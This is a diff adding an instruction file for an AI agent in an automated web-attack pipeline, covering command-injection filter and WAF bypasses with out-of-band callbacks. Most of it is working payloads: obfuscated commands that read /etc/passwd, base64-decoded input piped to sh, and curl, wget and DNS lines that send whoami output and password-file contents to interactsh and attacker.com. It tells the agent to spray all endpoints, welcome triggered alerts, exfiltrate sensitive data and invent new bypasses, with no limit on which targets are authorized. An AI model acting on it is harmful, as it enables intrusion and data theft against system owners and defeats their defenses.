@@ -1,0 +1,580 @@
+# Task 47: Advanced Command Injection Bypass + OOB
+# ==============================================================================
+# JULES AI AGENT INSTRUCTIONS - FULL BRAIN MODE
+# ==============================================================================
+
+## TASK IDENTITY
+- **Task Number**: 47
+- **Task Name**: Advanced Command Injection Bypass + OOB
+- **Category**: Phase 4 - Injection Testing (Step 12)
+- **Depends On**: Task 46 (Commix baseline), Task 32 (WAF detection)
+- **AI Brain**: cmdi_bypass_scanner.py
+
+## PURPOSE
+Catch command injections that Task 46 (Commix) missed due to:
+1. WAF blocking standard payloads
+2. Blind injection (no output)
+3. Character restrictions/filters
+4. Space/special char filtering
+
+Uses advanced bypass techniques + OOB callbacks via Interactsh.
+
+## INPUT FILES
+
+```
+PRIMARY (from Task 46 failures):
+├── outputs/cmdi/task47_targets.txt      # WAF-blocked/possible from Task 46
+├── outputs/cmdi/commix_possible.txt     # Timeouts/heuristic matches
+
+FALLBACK (if Task 46 not run):
+├── outputs/queue_dynamic_endpoints_urls.txt
+├── outputs/arjun_found_params.txt
+├── outputs/api_endpoints_live.txt
+
+INTELLIGENCE:
+├── outputs/waf/waf_results.json         # WAF type (Task 32)
+├── outputs/nuclei/tech_stack.json       # OS detection (Task 35)
+```
+
+## OUTPUT FILES
+
+```
+outputs/cmdi/
+├── bypass_vulnerable.txt         # Confirmed via bypass
+├── oob_vulnerable.txt            # Confirmed via OOB callback
+├── bypass_results.json           # Full results
+├── interactsh_hits.json          # OOB callback hits
+
+outputs/vulnerabilities/
+├── CMDI-BYPASS-{hash}-CRITICAL.md
+├── CMDI-BLIND-{hash}-CRITICAL.md
+```
+
+## BYPASS TECHNIQUES
+
+### 1. Space Bypass (Most Common Filter)
+
+```bash
+# ${IFS} - Internal Field Separator
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+cat$IFS$9/etc/passwd
+
+# Brace expansion
+{cat,/etc/passwd}
+{ls,-la,/}
+
+# Tab character
+cat%09/etc/passwd
+
+# Input redirection (no space needed)
+cat</etc/passwd
+
+# $@ expansion
+cat$@/etc/passwd
+```
+
+### 2. Blacklist Bypass
+
+```bash
+# Quote insertion
+c'a't /etc/passwd
+c"a"t /etc/passwd
+
+# Backslash
+c\at /etc/passwd
+/e\tc/pas\swd
+
+# Variable expansion
+$'\x63\x61\x74' /etc/passwd  # cat
+$(printf '\x63\x61\x74') /etc/passwd
+
+# Wildcards
+cat /e??/p?ss??
+cat /e*c/p*d
+
+# Base64 encoding
+echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|sh
+```
+
+### 3. Character Restriction Bypass
+
+```bash
+# No / character - use environment
+${HOME:0:1}  # equals /
+${PATH:0:1}  # equals /
+${PWD:0:1}   # equals /
+
+# Build commands from existing strings
+${PATH##*:}  # might give /bin or /usr/bin
+
+# Brace expansion for paths
+{cat,${HOME:0:1}etc${HOME:0:1}passwd}
+```
+
+### 4. Newline/Null Injection
+
+```bash
+# Newline injection
+%0aid
+%0awhoami
+
+# Null byte (truncate)
+;id%00
+;id%00.jpg
+```
+
+### 5. Time-based Blind
+
+```bash
+# Sleep-based detection
+;sleep${IFS}5
+`sleep${IFS}5`
+$(sleep${IFS}5)
+|sleep${IFS}5|
+
+# Ping-based (more reliable)
+;ping${IFS}-c${IFS}5${IFS}127.0.0.1
+```
+
+### 6. OOB (Out-of-Band) Callbacks
+
+```bash
+# DNS exfiltration
+;nslookup${IFS}$(whoami).{interactsh_id}
+;host${IFS}$(id|base64).{interactsh_id}
+
+# HTTP callback
+;curl${IFS}http://{interactsh_id}
+;wget${IFS}http://{interactsh_id}/$(whoami)
+
+# Data exfiltration
+;curl${IFS}http://{interactsh_id}/?d=$(cat${IFS}/etc/passwd|base64)
+```
+
+### 7. Advanced/Additional Bypass Techniques
+
+```bash
+# Double URL encoding
+%253Bid          # decodes to %3Bid then ;id
+
+# Unicode normalization
+%u003Bid         # Unicode semicolon
+﹔id             # Small semicolon U+FE54
+｜id             # Fullwidth vertical bar
+
+# Comment injection
+;id#
+;id//
+;/**/id
+
+# Environment variable abuse
+;$0              # Current shell
+;${SHELL}        # /bin/bash or /bin/sh
+;${SHELL:0:1}${SHELL:1:1}${SHELL:2:1}${SHELL:3:1}  # Build path
+
+# CRLF + Command
+%0d%0aid
+%0d%0a%0d%0aid
+
+# Arithmetic expansion
+$((1+1))         # Returns 2 - test if shell processes it
+;id$((0))        # id0 but confirms shell parsing
+
+# Here-string / Here-doc
+;cat<<<'test'
+;base64 -d<<<'aWQ='|sh
+
+# Reverse shell obfuscation (for testing, not exploitation)
+;$(echo${IFS}id|rev|rev)
+
+# Windows-specific
+&whoami
+|whoami
+%0awhoami
+^|whoami         # Caret escape
+cmd /c whoami
+powershell -c whoami
+```
+
+### 8. HTTP Parameter Pollution (HPP)
+
+```
+# Same parameter multiple times
+?cmd=safe&cmd=;id
+?cmd=safe&cmd=|whoami
+
+# Array notation
+?cmd[]=safe&cmd[]=;id
+?cmd[0]=safe&cmd[1]=;id
+```
+
+### 9. Content-Type Tricks
+
+```bash
+# JSON body injection (if API accepts JSON)
+{"cmd": "safe\";id;#"}
+{"cmd": "safe`id`"}
+
+# XML body injection
+<cmd>safe;id</cmd>
+```
+
+## OOB CALLBACK SETUP (INTERACTSH)
+
+### Start Interactsh Server:
+```bash
+interactsh-client -v > interactsh_log.txt &
+# Note the generated subdomain: abc123.oast.fun
+```
+
+### Payload with OOB:
+```python
+OOB_PAYLOADS = [
+    ";curl${IFS}http://{oob_id}/?p=cmdi",
+    ";wget${IFS}http://{oob_id}/?p=cmdi",
+    ";nslookup${IFS}{oob_id}",
+    ";ping${IFS}-c${IFS}1${IFS}{oob_id}",
+    "`curl${IFS}http://{oob_id}/?p=bt`",
+    "$(wget${IFS}http://{oob_id}/?p=sub)",
+]
+```
+
+## AI BRAIN LOGIC
+
+```
+1. START INTERACTSH
+   ├── Launch interactsh-client
+   ├── Capture generated subdomain
+   └── Set up polling for callbacks
+
+2. LOAD TARGETS
+   ├── Primary: task47_targets.txt (Task 46 failures)
+   ├── Load WAF info for bypass selection
+   └── Prioritize by WAF type
+
+3. FOR EACH TARGET:
+   a. Determine appropriate bypass based on WAF
+   b. Generate bypass payload list
+   c. For each parameter:
+      - Send bypass payloads
+      - Send OOB payloads with unique ID
+      - Check for response changes
+      - Poll Interactsh for callbacks
+
+4. CHECK INTERACTSH HITS
+   ├── If callback received → CONFIRMED BLIND CMDi
+   ├── Map callback ID back to URL/param
+   └── Generate report
+
+5. OUTPUT RESULTS
+   ├── bypass_vulnerable.txt
+   ├── oob_vulnerable.txt
+   └── interactsh_hits.json
+```
+
+## WAF-SPECIFIC BYPASS STRATEGIES
+
+```yaml
+cloudflare:
+  - Double URL encoding
+  - ${IFS} space bypass
+  - Unicode encoding
+  - Chunked transfer
+
+akamai:
+  - Case variation: CaT, wHoAmI
+  - Comment injection: c/**/at
+  - Base64 encoding
+
+imperva:
+  - Null byte injection
+  - HTTP parameter pollution
+  - Unicode normalization
+
+modsecurity:
+  - Backslash escaping
+  - Quote alternation
+  - Wildcard characters
+
+default:
+  - All ${IFS} variants
+  - Brace expansion
+  - OOB callbacks
+```
+
+## PAYLOAD MATRIX
+
+```python
+BYPASS_MATRIX = {
+    'space': [
+        '${IFS}', '$IFS', '$IFS$9', '%09', '<',
+        '{cmd,arg}', '$@',
+    ],
+    'cat_bypass': [
+        "c'a't", 'c"a"t', 'c\\at', '/bin/cat',
+        '$(printf cat)', '$\'\\x63\\x61\\x74\'',
+    ],
+    'path_bypass': [
+        '/e??/p?ss??', '/e*c/p*d',
+        '${HOME:0:1}etc${HOME:0:1}passwd',
+    ],
+    'encoding': [
+        'base64 -d', 'xxd -r', 'printf',
+    ],
+}
+
+# Build payloads dynamically
+def build_bypass_payloads(base_cmd='id'):
+    payloads = []
+    for separator in [';', '|', '||', '&&', '`', '$(', '%0a']:
+        for space in BYPASS_MATRIX['space']:
+            if separator == '`':
+                payloads.append(f"`{base_cmd}`")
+            elif separator == '$(':
+                payloads.append(f"$({base_cmd})")
+            else:
+                payloads.append(f"{separator}{base_cmd.replace(' ', space)}")
+    return payloads
+```
+
+## VULNERABILITY REPORT TEMPLATE (BLIND)
+
+```markdown
+# Blind Command Injection: CMDI-BLIND-{hash}
+
+## Summary
+| Field | Value |
+|-------|-------|
+| **ID** | CMDI-BLIND-{hash} |
+| **URL** | {url} |
+| **Parameter** | {param} |
+| **Detection** | OOB Callback (Interactsh) |
+| **Bypass** | {bypass_technique} |
+| **Severity** | CRITICAL |
+
+## OOB Callback Evidence
+```
+Interactsh subdomain: {oob_id}
+Callback received: {timestamp}
+Callback data: {callback_data}
+```
+
+## Payload Used
+```
+{payload}
+```
+
+## Impact
+Blind command injection with OOB confirmation means:
+- Commands ARE executing on the server
+- Output is not visible but exfiltration is possible
+- Full RCE is confirmed
+
+## Data Exfiltration PoC
+```bash
+# Exfiltrate /etc/passwd via DNS
+;host$(cat${IFS}/etc/passwd|base64|head${IFS}-c${IFS}60).{attacker_domain}
+
+# Exfiltrate via HTTP
+;curl${IFS}http://attacker.com/?d=$(cat${IFS}/etc/passwd|base64)
+```
+```
+
+## EXECUTION FLOW
+
+```
+┌─────────────────────────────────────────┐
+│  1. Start Interactsh listener           │
+│     - Get unique subdomain              │
+│     - Begin polling for callbacks       │
+└─────────────────────────────────────────┘
+                    │
+                    ▼
+┌─────────────────────────────────────────┐
+│  2. Load Task 46 failures:              │
+│     - task47_targets.txt                │
+│     - WAF info for bypass selection     │
+└─────────────────────────────────────────┘
+                    │
+                    ▼
+┌─────────────────────────────────────────┐
+│  3. For each target (with tracking ID): │
+│     a. Send bypass payloads             │
+│     b. Send OOB payloads with unique ID │
+│     c. Check response timing/changes    │
+└─────────────────────────────────────────┘
+                    │
+                    ▼
+┌─────────────────────────────────────────┐
+│  4. Poll Interactsh for hits:           │
+│     - Extract callback ID               │
+│     - Map back to URL/parameter         │
+│     - CONFIRMED BLIND CMDi              │
+└─────────────────────────────────────────┘
+                    │
+                    ▼
+┌─────────────────────────────────────────┐
+│  5. Output:                             │
+│     - bypass_vulnerable.txt             │
+│     - oob_vulnerable.txt                │
+│     - CMDI-BLIND-*.md reports           │
+└─────────────────────────────────────────┘
+```
+
+## HOW TO RUN
+
+```bash
+# Full bypass + OOB scan (requires interactsh)
+python cmdi_bypass_scanner.py --workspace d:\wallet\Mylab
+
+# Without OOB (bypass only)
+python cmdi_bypass_scanner.py --workspace d:\wallet\Mylab --no-oob
+
+# With custom Interactsh server
+python cmdi_bypass_scanner.py --workspace d:\wallet\Mylab --oob-server your-domain.oast.fun
+
+# Test specific URL
+python cmdi_bypass_scanner.py --workspace d:\wallet\Mylab --url "http://target/?cmd=test"
+
+# Resume
+python cmdi_bypass_scanner.py --workspace d:\wallet\Mylab --resume
+```
+
+## INTERACTSH ALTERNATIVES
+
+If Interactsh not available:
+```yaml
+alternatives:
+  - Burp Collaborator (if Burp available)
+  - pingb.in (public OOB service)
+  - webhook.site (HTTP callbacks)
+  - RequestBin (HTTP callbacks)
+  - Custom DNS server (dnschef)
+```
+
+## EXPLOITATION NOTES
+
+```
+1. OOB callbacks = GO AGGRESSIVE, spray all endpoints
+2. Trigger alerts = GOOD, means payload executed
+3. Interactsh = FULL capability, exfil data as needed
+4. EXFILTRATE sensitive data to prove impact
+5. Use various encodings to maximize success
+```
+
+## AI AGENT CREATIVITY DIRECTIVE
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│  IMPORTANT: The techniques above are NOT exhaustive!                │
+│                                                                     │
+│  After trying the documented payloads, USE YOUR OWN BRAIN:          │
+│                                                                     │
+│  ✓ Combine techniques creatively (e.g., base64 + ${IFS} + brace)   │
+│  ✓ Observe error messages - they reveal what's being filtered      │
+│  ✓ Adapt payloads based on response behavior                       │
+│  ✓ Try technique variations not listed here                        │
+│  ✓ Consider the specific tech stack (PHP, Java, Node, Python)      │
+│  ✓ Research new bypass techniques if standard ones fail            │
+│  ✓ Chain multiple encoding layers if single encoding blocked       │
+│  ✓ Test edge cases: empty values, very long strings, special chars │
+│                                                                     │
+│  If you discover a NEW working technique, LOG IT in the report     │
+│  so it can be added to future scans!                                │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+### Think Like an Attacker
+
+```yaml
+observe:
+  - What characters cause errors? (reveals blacklist)
+  - What characters pass through? (reveals whitelist gaps)
+  - Does response change with different payloads?
+  - Is there a length limit?
+  - Is encoding normalized?
+
+adapt:
+  - If `;` blocked → try `%0a` or `||`
+  - If `space` blocked → try `${IFS}` or `%09` or `<`
+  - If `cat` blocked → try `head` or `tail` or `/bin/cat`
+  - If `/` blocked → try `${HOME:0:1}` or `${PWD:0:1}`
+  - If `id` blocked → try `whoami` or `pwd` or `uname`
+  - If all output blocked → go BLIND (time-based or OOB)
+
+combine:
+  - `%0a{c'a't,${HOME:0:1}e?c${HOME:0:1}pas*}`
+  - `||echo${IFS}$(id|base64)|base64${IFS}-d`
+  - Whatever works = valid technique
+```
+
+## INTEGRATION SUMMARY
+
+```
+Task 46 (Commix)
+    │
+    ├─► vulnerable → Report immediately
+    │
+    └─► waf_blocked/possible → task47_targets.txt
+                                      │
+                                      ▼
+                              Task 47 (This task)
+                                      │
+                              ┌───────┴───────┐
+                              │               │
+                              ▼               ▼
+                         Bypass           OOB Callback
+                         Payloads         (Interactsh)
+                              │               │
+                              └───────┬───────┘
+                                      │
+                                      ▼
+                              CONFIRMED CMDi
+                              (Output or Blind)
+```
+
+## AI AGENT CREATIVITY DIRECTIVE
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    🧠 YOU ARE AN INTELLIGENT AGENT 🧠                       │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ You are here because standard payloads FAILED. Time to think creatively.    │
+│                                                                             │
+│ REVERSE ENGINEER THE FILTER:                                                │
+│                                                                             │
+│ 1. What EXACTLY is being blocked?                                           │
+│    - Send: ; → blocked? Try: %0a, ||, &&, |                                 │
+│    - Send: space → blocked? Try: ${IFS}, %09, <, $IFS$9                     │
+│    - Send: /etc/passwd → blocked? Try: /e?c/pa*wd, /???/??ss??             │
+│                                                                             │
+│ 2. What characters PASS THROUGH?                                            │
+│    - If ${ works but ; doesn't → use ${IFS} and backticks                   │
+│    - If encoding works → chain: %252f for double-encoded /                  │
+│                                                                             │
+│ COMBINE TECHNIQUES:                                                         │
+│                                                                             │
+│ • Space bypass + command obfuscation + encoding:                            │
+│   c${IFS}a${IFS}t${IFS}/e?c/pas*                                            │
+│                                                                             │
+│ • Base64 for complex commands:                                              │
+│   echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|sh                          │
+│                                                                             │
+│ • Brace expansion for spaces:                                               │
+│   {cat,/etc/passwd}                                                         │
+│                                                                             │
+│ BLIND INJECTION THINKING:                                                   │
+│                                                                             │
+│ • No output visible? → Use OOB (Interactsh)                                 │
+│   curl${IFS}http://YOUR_ID.oast.fun/$(whoami)                               │
+│                                                                             │
+│ • OOB blocked? → Use time-based                                             │
+│   sleep${IFS}5 → measure response time                                      │
+│                                                                             │
+│ • DNS only? → Exfiltrate via DNS                                            │
+│   ping${IFS}$(whoami).YOUR_ID.oast.fun                                      │
+│                                                                             │
+│ INVENT NEW BYPASSES:                                                        │
+│ The payloads above are examples. Mix, match, modify based on what you       │
+│ observe. If you think a weird combination might work - TRY IT.              │
+└─────────────────────────────────────────────────────────────────────────────┘
